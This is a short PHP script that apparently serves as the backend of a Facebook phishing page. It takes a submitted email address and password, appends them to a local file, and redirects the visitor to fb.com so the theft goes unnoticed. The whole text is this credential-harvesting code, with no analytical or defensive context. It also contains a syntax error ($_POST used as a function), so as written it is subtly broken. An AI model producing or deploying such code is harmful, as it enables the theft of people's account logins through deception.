<?php
$email=($_POST["email"]);
$password=$_POST('password');
$data=$email.','.$password;
$file='file';
file_put_contents($file,$data . PHP_EOL, FILE_APPEND);
header("Location:http://fb.com")







?>